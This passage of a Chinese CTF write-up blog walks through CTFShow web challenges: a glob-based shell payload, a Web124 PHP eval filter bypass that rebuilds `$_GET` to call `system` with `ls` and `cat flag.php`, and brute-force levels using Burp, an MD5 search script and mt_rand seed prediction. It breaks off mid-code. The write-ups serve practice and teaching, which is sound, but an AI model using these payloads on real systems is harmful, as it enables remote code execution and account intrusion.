long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br><span class="line">&quot;OS error code  11:  Resource temporarily unavailable&quot;</span><br><span class="line">&quot;OS error code  12:  Cannot allocate memory&quot;</span><br><span class="line">&quot;OS error code  13:  Permission denied&quot;</span><br><span class="line">&quot;OS error code  14:  Bad address&quot;</span><br><span class="line">&quot;OS error code  15:  Block device required&quot;</span><br><span class="line">&quot;OS error code  16:  Device or resource busy&quot;</span><br><span class="line">&quot;OS error code  17:  File exists&quot;</span><br><span class="line">&quot;OS error code  18:  Invalid cross-device link&quot;</span><br><span class="line">&quot;OS error code  19:  No such device&quot;</span><br><span class="line">&quot;OS error code  20:  Not a directory&quot;</span><br><span class="line">&quot;OS error code  21:  Is a directory&quot;</span><br><span class="line">&quot;OS error code  22:  Invalid argument&quot;</span><br><span class="line">&quot;OS error code  23:  Too many open files in system&quot;</span><br><span class="line">&quot;OS error code  24:  Too many open files&quot;</span><br><span class="line">&quot;OS error code  25:  Inappropriate ioctl for device&quot;</span><br><span class="line">&quot;OS error code  26:  Text file busy&quot;</span><br><span class="line">&quot;OS error code  27:  File too large&quot;</span><br><span class="line">&quot;OS error code  28:  No space left on device&quot;</span><br><span class="line">&quot;OS error code  29:  Illegal seek&quot;</span><br><span class="line">&quot;OS error code  30:  Read-only file system&quot;</span><br><span class="line">&quot;OS error code  31:  Too many links&quot;</span><br><span class="line">&quot;OS error code  32:  Broken pipe&quot;</span><br><span class="line">&quot;OS error code  33:  Numerical argument out of domain&quot;</span><br><span class="line">&quot;OS error code  34:  Numerical result out of range&quot;</span><br><span class="line">&quot;OS error code  35:  Resource deadlock avoided&quot;</span><br><span class="line">&quot;OS error code  36:  File name too long&quot;</span><br><span class="line">&quot;OS error code  37:  No locks available&quot;</span><br><span class="line">&quot;OS error code  38:  Function not implemented&quot;</span><br><span class="line">&quot;OS error code  39:  Directory not empty&quot;</span><br><span class="line">&quot;OS error code  40:  Too many levels of symbolic links&quot;</span><br><span class="line">&quot;OS error code  42:  No message of desired type&quot;</span><br><span class="line">&quot;OS error code  43:  Identifier removed&quot;</span><br><span class="line">&quot;OS error code  44:  Channel number out of range&quot;</span><br><span class="line">&quot;OS error code  45:  Level 2 not synchronized&quot;</span><br><span class="line">&quot;OS error code  46:  Level 3 halted&quot;</span><br><span class="line">&quot;OS error code  47:  Level 3 reset&quot;</span><br><span class="line">&quot;OS error code  48:  Link number out of range&quot;</span><br><span class="line">&quot;OS error code  49:  Protocol driver not attached&quot;</span><br><span class="line">&quot;OS error code  50:  No CSI structure available&quot;</span><br><span class="line">&quot;OS error code  51:  Level 2 halted&quot;</span><br><span class="line">&quot;OS error code  52:  Invalid exchange&quot;</span><br><span class="line">&quot;OS error code  53:  Invalid request descriptor&quot;</span><br><span class="line">&quot;OS error code  54:  Exchange full&quot;</span><br><span class="line">&quot;OS error code  55:  No anode&quot;</span><br><span class="line">&quot;OS error code  56:  Invalid request code&quot;</span><br><span class="line">&quot;OS error code  57:  Invalid slot&quot;</span><br><span class="line">&quot;OS error code  59:  Bad font file format&quot;</span><br><span class="line">&quot;OS error code  60:  Device not a stream&quot;</span><br><span class="line">&quot;OS error code  61:  No data available&quot;</span><br><span class="line">&quot;OS error code  62:  Timer expired&quot;</span><br><span class="line">&quot;OS error code  63:  Out of streams resources&quot;</span><br><span class="line">&quot;OS error code  64:  Machine is not on the network&quot;</span><br><span class="line">&quot;OS error code  65:  Package not installed&quot;</span><br><span class="line">&quot;OS error code  66:  Object is remote&quot;</span><br><span class="line">&quot;OS error code  67:  Link has been severed&quot;</span><br><span class="line">&quot;OS error code  68:  Advertise error&quot;</span><br><span class="line">&quot;OS error code  69:  Srmount error&quot;</span><br><span class="line">&quot;OS error code  70:  Communication error on send&quot;</span><br><span class="line">&quot;OS error code  71:  Protocol error&quot;</span><br><span class="line">&quot;OS error code  72:  Multihop attempted&quot;</span><br><span class="line">&quot;OS error code  73:  RFS specific error&quot;</span><br><span class="line">&quot;OS error code  74:  Bad message&quot;</span><br><span class="line">&quot;OS error code  75:  Value too large for defined data type&quot;</span><br><span class="line">&quot;OS error code  76:  Name not unique on network&quot;</span><br><span class="line">&quot;OS error code  77:  File descriptor in bad state&quot;</span><br><span class="line">&quot;OS error code  78:  Remote address changed&quot;</span><br><span class="line">&quot;OS error code  79:  Can not access a needed shared library&quot;</span><br><span class="line">&quot;OS error code  80:  Accessing a corrupted shared library&quot;</span><br><span class="line">&quot;OS error code  81:  .lib section in a.out corrupted&quot;</span><br><span class="line">&quot;OS error code  82:  Attempting to link in too many shared libraries&quot;</span><br><span class="line">&quot;OS error code  83:  Cannot exec a shared library directly&quot;</span><br><span class="line">&quot;OS error code  84:  Invalid or incomplete multibyte or wide character&quot;</span><br><span class="line">&quot;OS error code  85:  Interrupted system call should be restarted&quot;</span><br><span class="line">&quot;OS error code  86:  Streams pipe error&quot;</span><br><span class="line">&quot;OS error code  87:  Too many users&quot;</span><br><span class="line">&quot;OS error code  88:  Socket operation on non-socket&quot;</span><br><span class="line">&quot;OS error code  89:  Destination address required&quot;</span><br><span class="line">&quot;OS error code  90:  Message too long&quot;</span><br><span class="line">&quot;OS error code  91:  Protocol wrong type for socket&quot;</span><br><span class="line">&quot;OS error code  92:  Protocol not available&quot;</span><br><span class="line">&quot;OS error code  93:  Protocol not supported&quot;</span><br><span class="line">&quot;OS error code  94:  Socket type not supported&quot;</span><br><span class="line">&quot;OS error code  95:  Operation not supported&quot;</span><br><span class="line">&quot;OS error code  96:  Protocol family not supported&quot;</span><br><span class="line">&quot;OS error code  97:  Address family not supported by protocol&quot;</span><br><span class="line">&quot;OS error code  98:  Address already in use&quot;</span><br><span class="line">&quot;OS error code  99:  Cannot assign requested address&quot;</span><br><span class="line">&quot;OS error code 100:  Network is down&quot;</span><br><span class="line">&quot;OS error code 101:  Network is unreachable&quot;</span><br><span class="line">&quot;OS error code 102:  Network dropped connection on reset&quot;</span><br><span class="line">&quot;OS error code 103:  Software caused connection abort&quot;</span><br><span class="line">&quot;OS error code 104:  Connection reset by peer&quot;</span><br><span class="line">&quot;OS error code 105:  No buffer space available&quot;</span><br><span class="line">&quot;OS error code 106:  Transport endpoint is already connected&quot;</span><br><span class="line">&quot;OS error code 107:  Transport endpoint is not connected&quot;</span><br><span class="line">&quot;OS error code 108:  Cannot send after transport endpoint shutdown&quot;</span><br><span class="line">&quot;OS error code 109:  Too many references: cannot splice&quot;</span><br><span class="line">&quot;OS error code 110:  Connection timed out&quot;</span><br><span class="line">&quot;OS error code 111:  Connection refused&quot;</span><br><span class="line">&quot;OS error code 112:  Host is down&quot;</span><br><span class="line">&quot;OS error code 113:  No route to host&quot;</span><br><span class="line">&quot;OS error code 114:  Operation already in progress&quot;</span><br><span class="line">&quot;OS error code 115:  Operation now in progress&quot;</span><br><span class="line">&quot;OS error code 116:  Stale NFS file handle&quot;</span><br><span class="line">&quot;OS error code 117:  Structure needs cleaning&quot;</span><br><span class="line">&quot;OS error code 118:  Not a XENIX named type file&quot;</span><br><span class="line">&quot;OS error code 119:  No XENIX semaphores available&quot;</span><br><span class="line">&quot;OS error code 120:  Is a named type file&quot;</span><br><span class="line">&quot;OS error code 121:  Remote I/O error&quot;</span><br><span class="line">&quot;OS error code 122:  Disk quota exceeded&quot;</span><br><span class="line">&quot;OS error code 123:  No medium found&quot;</span><br><span class="line">&quot;OS error code 124:  Wrong medium type&quot;</span><br><span class="line">&quot;OS error code 125:  Operation canceled&quot;</span><br><span class="line">&quot;OS error code 126:  Required key not available&quot;</span><br><span class="line">&quot;OS error code 127:  Key has expired&quot;</span><br><span class="line">&quot;OS error code 128:  Key has been revoked&quot;</span><br><span class="line">&quot;OS error code 129:  Key was rejected by service&quot;</span><br><span class="line">&quot;OS error code 130:  Owner died&quot;</span><br><span class="line">&quot;OS error code 131:  State not recoverable&quot;</span><br><span class="line">&quot;MySQL error code 132: Old database file&quot;</span><br><span class="line">&quot;MySQL error code 133: No record read before update&quot;</span><br><span class="line">&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;</span><br><span class="line">&quot;MySQL error code 135: No more room in record file&quot;</span><br><span class="line">&quot;MySQL error code 136: No more room in index file&quot;</span><br><span class="line">&quot;MySQL error code 137: No more records (read after end of file)&quot;</span><br><span class="line">&quot;MySQL error code 138: Unsupported extension used for table&quot;</span><br><span class="line">&quot;MySQL error code 139: Too big row&quot;</span><br><span class="line">&quot;MySQL error code 140: Wrong create options&quot;</span><br><span class="line">&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;</span><br><span class="line">&quot;MySQL error code 142: Unknown character set used&quot;</span><br><span class="line">&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;</span><br><span class="line">&quot;MySQL error code 144: Table is crashed and last repair failed&quot;</span><br><span class="line">&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;</span><br><span class="line">&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 147: Lock table is full;  Restart program with a larger locktable&quot;</span><br><span class="line">&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;</span><br><span class="line">&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;</span><br><span class="line">&quot;MySQL error code 151: Cannot add a child row&quot;</span><br><span class="line">&quot;MySQL error code 152: Cannot delete a parent row&quot;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure><p>试个几十次就会出来base64 解码拿到flag</p><h2 id="Web124"><a href="#Web124" class="headerlink" title="Web124"></a>Web124</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>不能有特殊字符，不能输入除whitelist内的其他字符</p><p>这里可以利用进制转换构造出字母的思路来绕过</p><blockquote><p>base_convert() 函数在任意进制之间转换数字</p><p>decbin() 函数把十进制转换为二进制</p><p>bindec() 把二进制转换为十进制</p><p>dechex() 把十进制转换为十六进制</p><p>decoct() 把十进制转换为八进制</p><p>hex2bin() 把十六进制值转换为 ASCII 字符</p></blockquote><p>利用动态函数调用的思路</p><p><code>$_GET[abs]($_GET[acos])</code> # 有一个80字符的长度限制 abs，acos是因为只能输入whitelist内的字符</p><p>↓</p><p><code>$_GET&#123;abs&#125;($_GET&#123;acos&#125;)</code> # []被过滤使用{}代替</p><p>↓</p><p>进制转换构造_GET # _GET 10进制:1598506324 16进制5f474554但无法传入字母<br><code>dechex(1598506324)</code> # 5f474554 → <code>hex2bin(dechex(1598506324))</code> # _GET</p><p>↓</p><p><code>base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))</code> # hex2bin无法传入用<code>base_convert(&#39;37907361743&#39;,10,36)</code>代替</p><p>↓</p><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;37907361743&#x27;</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;abs&#125;(<span class="variable">$$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=ls <span class="comment"># 查看目录</span></span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;37907361743&#x27;</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;abs&#125;(<span class="variable">$$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=cat flag.php <span class="comment"># 查看flag.php</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># $pi 只能传入whitelist内字符</span></span><br><span class="line"><span class="comment"># $$pi $_GET</span></span><br><span class="line"><span class="comment"># $$pi&#123;abs&#125;($$pi&#123;acos&#125;); $_GET&#123;abs&#125;($_GET&#123;acos&#125;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_爆破</title>
      <link href="/posts/7ba9ac12/"/>
      <url>/posts/7ba9ac12/</url>
      
        <content type="html"><![CDATA[<h2 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h2><p>随便输入抓包</p><p><img src="/posts/7ba9ac12/image-20220319165145359.png" alt="image-20220319165145359"></p><p>发现Base64加密</p><p><img src="/posts/7ba9ac12/image-20220319165235902.png" alt="image-20220319165235902"></p><p>账号和密码用:隔开</p><p>使用BP构造payload爆破</p><p><img src="/posts/7ba9ac12/image-20220319190509094.png" alt="image-20220319190509094"></p><p>下载官方提供的字典 把后缀名改为.zip即可打开</p><p><img src="/posts/7ba9ac12/image-20220319165739427.png" alt="image-20220319165739427"></p><p>使用Custom iterator模式</p><p><img src="/posts/7ba9ac12/image-20220319190606258.png" alt="image-20220319190606258"></p><p>第一部分</p><p><img src="/posts/7ba9ac12/image-20220319190709183.png" alt="image-20220319190709183"></p><p>第二部分</p><p><img src="/posts/7ba9ac12/image-20220319190752812.png" alt="image-20220319190752812"></p><p>第三部分使用字典</p><p><img src="/posts/7ba9ac12/image-20220319190821533.png" alt="image-20220319190821533"></p><p>添加base64加密</p><p><img src="/posts/7ba9ac12/image-20220319190843326.png" alt="image-20220319190843326"></p><p><img src="/posts/7ba9ac12/image-20220319170555561.png" alt="image-20220319170555561"></p><p>关闭url编码</p><p><img src="/posts/7ba9ac12/image-20220319190859899.png" alt="image-20220319190859899"></p><p>爆破完按length排序查看最小的回包</p><p><img src="/posts/7ba9ac12/image-20220319215305817.png" alt="image-20220319215305817"></p><p><img src="/posts/7ba9ac12/image-20220319200822331.png" alt="image-20220319200822331"></p><h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>子域名爆破，爆破ctf.show</p><p><img src="/posts/7ba9ac12/image-20220321152412725.png" alt="image-20220321152412725"></p><p>最终在vip.ctf.show的源码发现了flag</p><p><img src="/posts/7ba9ac12/image-20220321152516231.png" alt="image-20220321152516231"></p><h2 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这片代码主要的就是后面这两个if判断 我们需要构造一个符合条件的token</p><p>第一个条件:md5加密后的token第2，15，18位相等</p><p>第二个条件：第2，15，位与 18位&#x2F;2位的值 相加等于第32位</p><p>使用python脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789qazwsxedcrfvtgbyhnujmikolp&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        t = <span class="built_in">str</span>(a) + <span class="built_in">str</span>(b)</span><br><span class="line">        md5 = hashlib.md5(t.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">1</span>:<span class="number">2</span>] == md5[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> md5[<span class="number">14</span>:<span class="number">15</span>] == md5[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) + <span class="built_in">int</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) + <span class="built_in">int</span>(md5[<span class="number">17</span>:<span class="number">18</span>]) / <span class="built_in">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) == <span class="built_in">int</span>(md5[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>得出结果是 3j</p><p><img src="/posts/7ba9ac12/image-20220321155828841.png" alt="image-20220321155828841"></p><p>拿到flag</p><h2 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>my_srand()函数</p><blockquote><p>mt_srand() 播种 Mersenne Twister 随机数生成器。<br>mt_srand(seed)<br>seed 必需。用seed来给随机数发生器播种</p><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到运行结果</p><p><img src="/posts/7ba9ac12/image-20220321163809287.png" alt="image-20220321163809287"></p><p>这里有个问题：不同的php版本得到的结果可能不一样 我使用的php版本得到的结果是 999695185但是在菜鸟在线运行工具中的得到的结果是上图 ，这道题的答案也是上图</p><p>已get方式通过r传参</p><p>得到flag</p><p><img src="/posts/7ba9ac12/image-20220321164027209.png" alt="image-20220321164027209"></p><h2 id="Web25"><a href="#Web25" class="headerlink" title="Web25"></a>Web25</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span 